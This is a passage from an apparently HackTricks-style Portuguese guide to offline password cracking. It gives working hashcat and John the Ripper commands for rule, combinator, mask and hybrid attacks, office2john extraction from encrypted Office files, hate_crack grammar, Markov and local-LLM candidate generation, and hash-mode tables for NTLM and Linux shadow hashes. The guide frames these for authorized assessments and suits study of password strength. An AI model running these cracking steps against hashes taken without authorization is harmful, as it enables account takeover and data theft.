- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Ferramentas de geração de wordlists**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gerador avançado de sequências de teclas, com caracteres base, mapa de teclado e rotas configuráveis.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### Mutação do John

Leia _**/etc/john/john.conf**_ e configure-o.

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcat attacks

- **Wordlist attack** (`-a 0`) com regras

O **Hashcat** já vem com uma **pasta que contém regras**, mas você pode encontrar [**outras regras interessantes aqui**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Explique e analise arquivos de regras

As regras do Hashcat executam opcodes da esquerda para a direita. Isso pode ser fácil de interpretar errado quando as operações atuam na posição zero: `^e ^h ^t` adiciona `e`, depois `h` e, em seguida, `t` ao início, transformando `password` em `thepassword`. As substituições comparam bytes e diferenciam maiúsculas de minúsculas, então uma regra como `sa@` não faz nada com um `A` maiúsculo. Teste regras desconhecidas com palavras-base representativas em minúsculas, maiúsculas e com uma combinação de ambas antes de gastar tempo de GPU com elas.<sup>[[6]](#references)[[9]](#references)</sup>

O [HashcatRosetta](https://github.com/bandrel/HashcatRosetta) pode mostrar cada candidato intermediário e resumir a distribuição de opcodes de um arquivo de regras completo. As contagens estáticas de opcodes revelam se um arquivo, em sua maioria, acrescenta, antepõe, substitui ou trunca caracteres. Elas não comprovam que uma regra vai quebrar uma senha, mas ajudam a selecionar um conjunto de regras que corresponda aos padrões de senha observados na população-alvo.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Reduza regras redundantes com logs de debug

O modo de debug do Hashcat registra as transformações das rules separadamente da saída normal de status e resultados. O modo `4` grava `baseword:rule:candidate`; o modo `5` acrescenta a wordlist de origem. Sempre defina `--debug-file` explicitamente. Caso contrário, o Hashcat abre `hashcat.debugfile` no diretório do perfil, e redirecionar stdout captura o fluxo do console, não esses registros. Os arquivos de debug são abertos em modo de acréscimo, então remova ou rotacione um arquivo antigo antes de uma nova medição e proteja-o, pois contém basewords e candidates em texto simples.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

Use `frequency` para encontrar as regras aplicadas com maior frequência, `basewords` para medir a cobertura de entradas distintas e `candidates` para contar as saídas distintas. A classificação de candidatos costuma ser o melhor ponto de partida para reduzir a lista, pois uma regra aplicada com frequência ainda pode fazer várias entradas convergirem para candidatos duplicados. Copie as regras de maior valor para um arquivo menor, execute-o novamente contra os hashes restantes e compare os relatórios entre as execuções. O modo `5` também mostra se cada wordlist de origem contribui com basewords úteis; force a análise com `--debug-mode 4` ou `--debug-mode 5` quando os dois-pontos nos dados tornarem ambígua a detecção automática.<sup>[[6]](#references)[[9]](#references)</sup>

- **Wordlist combinator** attack

É possível **combinar 2 wordlists em 1** com hashcat.\
Se a lista 1 contivesse a palavra **"hello"** e a segunda contivesse 2 linhas com as palavras **"world"** e **"earth"**, seriam geradas as palavras `helloworld` e `helloearth`.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks (exemplo de Office criptografado)

Uma senha pode ser longa e conter várias classes de caracteres e ainda assim ter um **espaço de busca efetivo** pequeno quando segue uma gramática conhecida. Para um documento do Office criptografado obtido durante uma avaliação autorizada, `office2john.py` extrai o registro de verificação da senha; isso permite fazer tentativas locais sem bloqueios online, limitação de taxa ou MFA. Isso não contorna a criptografia do documento.<sup>[[2]](#references)[[5]](#references)</sup>

Remova o campo do nome do arquivo que John acrescenta para que o Hashcat receba apenas o verificador:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

Selecione `-m` com base no prefixo extraído, e não na extensão do arquivo. O Hashcat mapeia `$office$*2007*`, `$office$*2010*` e `$office$*2013*` para os modos `9400`, `9500` e `9600`; registros legados `$oldoffice$0/$1` e `$oldoffice$3/$4` usam os modos `9700` e `9800`, respectivamente.<sup>[[3]](#references)</sup>

Se informações sobre reutilização de senhas, políticas, dicas ou pessoas familiarizadas com o usuário revelarem uma gramática como `<word><number><optional !><word>`, materialize como dicionário à esquerda o prefixo que pode ser enumerado independentemente. Este exemplo testa números de `0` a `99`; substitua o intervalo e as transformações por evidências da avaliação.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

O modo de ataque `1` do Hashcat acrescenta cada linha do dicionário da direita a cada linha do dicionário da esquerda, portanto arquivos com `L` e `R` linhas geram `L × R` candidatos antes da aplicação de quaisquer regras. O comando a seguir é específico para um registro legado `$oldoffice$3/$4`; altere o modo para outros formatos do Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Esse padrão de pré-processamento se generaliza para outros formatos verificáveis offline: enumere apenas combinações plausíveis de maiúsculas e minúsculas, datas, separadores, dígitos ou pontuação para um componente e, em seguida, combine-o com o componente restante, em vez de fazer brute-force do comprimento total nominal.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Valide arquivos `.hcmask` antes da execução

Uma linha malformada pode passar despercebida entre máscaras válidas, então valide o arquivo completo e seu keyspace estimado antes de iniciar o ataque. HashcatRosetta informa a linha com erro e retorna um status diferente de zero quando alguma máscara é inválida, tornando essa verificação adequada para scripts ou CI.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Não normalize arquivos de máscara com parsers genéricos de CSV ou texto. O Hashcat aceita charsets personalizados `?1` a `?8`, trata `#` como comentário apenas quando é o primeiro byte e remove escapes de barra invertida em uma única passagem, antes de interpretar tokens `?`. Portanto, espaços em branco antes de `#` fazem parte dos dados da máscara, e o escaping pode alterar se uma sequência é literal ou um token de charset.<sup>[[6]](#references)[[9]](#references)</sup>

- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Passes do Hashcat treinados no alvo com hate_crack

[hate_crack](https://github.com/trustedsec/hate_crack) orquestra passes locais do Hashcat depois que você tem um arquivo de hashes e sabe o modo do Hashcat. O próprio Hashcat precisa ser instalado separadamente. Clone com submódulos, execute `make` e, em seguida, inicie uma sessão interativa; o modo de exemplo `1000` é NTLM, não um padrão universal. Clones existentes precisam executar `git submodule update --init --recursive` antes de usar as opções PCFG e PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Aprenda uma gramática a partir de textos em claro recuperados.** Execute uma passagem inicial de dicionário/regras e, em seguida, treine `pcfg_cracker` com textos em claro relevantes para o alvo. Defina `pcfgRuleset` em `config.json` como o conjunto de regras treinado e escolha PCFG (menu `20`) para enviar estruturas prováveis ao Hashcat, ou PRINCE-LING (`21`) para criar uma lista base do PRINCE orientada por gramática. Limite os dois geradores com `pcfgMaxCandidates` e `pcfgPrinceLingMaxCandidates`; hate_crack não treina a gramática para você. PCFG aprende a probabilidade de estruturas como palavra-base seguida de dígitos e símbolos, ao contrário da gramática fixa do [exemplo de combinador orientado por gramática](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Extraia regras a partir de senhas conhecidas.** Spoonman (menu `22`) recebe um corpus de texto simples, incluindo o arquivo `.out` não vazio da sessão atual, e deriva palavras-base em letras minúsculas e regras do Hashcat que reconstroem as senhas observadas. Ele classifica as regras pelo número de senhas do corpus que reproduzem. Comece pelo nível de cobertura de 50% mais alto e expanda somente se o espaço de chaves adicional se justificar; combine as palavras-base derivadas com outras listas de palavras relevantes quando a cobertura for limitada pelo radical ausente, e não pela mutação. O Hashcat aceita no máximo 31 funções por regra, e seu alfabeto de posições abrange apenas os índices `0`–`35`; o Spoonman usa uma palavra-base literal e uma regra sem operação quando uma senha não pode ser codificada. Corpora muito grandes podem atingir o limite do contador de memória limitada, então consulte a cobertura informada em vez de presumir uma reconstrução completa. Consulte [comportamento das regras do Hashcat](#explain-and-profile-rule-files) antes de reutilizar a saída de forma independente.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Escolha um gerador de acordo com as evidências disponíveis.** OMEN (`13`) treina um modelo de transição de caracteres a partir de uma lista de senhas e enumera candidatos em ordem de probabilidade, até o limite de `omenMaxCandidates`. Já o Markov brute force (`15`) pode criar uma tabela `.hcstat2` a partir das senhas quebradas no `.out` atual ou de uma lista selecionada, e testar um intervalo incremental de comprimentos. Quando as informações sobre o alvo estão em prosa, e não em senhas, N-gram (`16`) alimenta um corpus, inclusive com entrada gzip, para `ngramX.bin`; o tamanho padrão do grupo é três. São alternativas, não três cópias da mesma lista de candidatos.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**Expanda apenas conjuntos pequenos e plausíveis.** Permutation (`17`) reordena todos os caracteres de cada palavra de entrada; portanto, até uma única palavra de oito caracteres gera `8!` ordenações. Combipow (`19`) gera combinações de subconjuntos não vazios a partir de um conjunto curto de palavras de passphrase; `-s` insere espaços, e a ferramenta rejeita mais de 63 linhas de entrada. Combinator (`6`) pode combinar várias listas de palavras com separadores por meio de `--sepFill`; a concatenação comum de duas listas é coberta pelo [combinator nativo do Hashcat](#hashcat-attacks) acima.<sup>[[13]](#references)[[14]](#references)</sup>

**Defina limites para ataques com feedback.** Fingerprint (`5`) expande iterativamente as senhas recém-quebradas com comprimentos de fragmento crescentes, em vez de reexpandir todo o corpus a cada rodada; o limite do espaço de chaves de combinação ignora uma passagem `-a 1` grande demais. Hybrid (`7`) testa decorações mais baratas `?s?d` antes de máscaras `?a` mais amplas de prefixo/sufixo, com `hcatHybridMaxRuntime` limitando a duração da execução. Isso importa porque o custo de uma passagem híbrida é o tamanho da lista de palavras multiplicado pelo espaço da máscara; portanto, uma máscara ampla aplicada a uma lista grande pode superar em muito o custo das passagens iniciais.<sup>[[13]](#references)[[14]](#references)</sup>

**Gere candidatos a partir de senhas recuperadas usando um LLM local.** Depois que uma passagem inicial gerar um arquivo `<hashfile>.out` não vazio, o ataque com LLM do hate_crack (menu principal `12`, submenu **Senhas quebradas** `3`) pode inferir palavras-base, anos, sufixos e uso de maiúsculas e minúsculas específicos do alvo e, em seguida, enviar novos candidatos ao Hashcat. Corpora pequenos podem incluir textos simples recuperados no prompt do modelo; corpora maiores são resumidos em estatísticas. Isso generaliza convenções observadas, em vez de apenas repetir as [regras](#explain-and-profile-rule-files) ou [máscaras](#hashcat-attacks) fixas acima.<sup>[[13]](#references)[[14]](#references)</sup>

Configure no `.env` do hate_crack um modelo local do Ollama que já esteja sendo servido; ele não baixa o modelo automaticamente. `OLLAMA_NO_CLOUD=true` rejeita modelos marcados como cloud e endereços de endpoints externos. Um endpoint em localhost, por si só, não é suficiente: o Ollama pode encaminhar remotamente um modelo `-cloud`, e os prompts podem conter textos simples recuperados ou estatísticas do corpus. Essa configuração ainda permite endpoints em redes privadas e não consegue descartar a existência de um proxy de transporte; portanto, verifique o caminho de inferência antes de enviar dados do cliente.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

Compare o rendimento de candidatos com passes mais baratos usando regras, máscaras e treinamento direcionado ao alvo antes de alocar um orçamento maior. O modelo gera tentativas; Hashcat ainda as testa contra os hashes.<sup>[[13]](#references)[[14]](#references)</sup>

#### Modos do Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking de hashes do Linux - arquivo /etc/shadow

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Quebra de hashes do Windows

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Cracking hashes comuns de aplicações

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```



## References

- [1] [Por dentro do GoBruteforcer: padrões de servidor gerados por IA, senhas fracas e campanhas focadas em cripto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hashes de exemplo do Hashcat e modos do Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Ataque combinator do Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Planejamento sucessório de credenciais](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [Repositório HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
- [7] [Implementação do arquivo de depuração do Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Ajuda da linha de comando do Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: lendo a Pedra de Roseta do cracking de senhas](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [Repositório e uso do PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
- [11] [Repositório e guia do usuário do OMEN](https://github.com/RUB-SysSec/OMEN)
- [12] [Problema original do Spoonman e projeto de derivação de regras](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [Repositório do hate_crack e documentação dos ataques](https://github.com/trustedsec/hate_crack)
- [14] [Novidades no hate_crack desde a versão 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [Política de destino do LLM do hate_crack](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
- [16] [Uso do bkcrack](https://github.com/kimci86/bkcrack/blob/master/readme.md)
- [17] [Tutorial de texto conhecido do bkcrack](https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md)
{{#include ../banners/hacktricks-training.md}}
